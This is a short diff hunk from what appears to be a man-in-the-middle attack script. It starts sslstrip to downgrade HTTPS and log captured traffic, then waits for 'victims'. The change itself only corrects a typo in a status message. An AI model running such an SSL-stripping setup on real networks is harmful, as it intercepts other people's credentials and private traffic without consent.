@@ -103,7 +103,7 @@ ssslog="sslstrip.${RANDOM}"
 echo "* starting sslstrip and logging results to ${ssslog}"
 sslstrip -f -k -w ${ssslog} & 
 
-echo "* setup complete, no we wait for victims"
+echo "* setup complete, now we wait for victims"
 while :; do
 	sleep 60
 done;
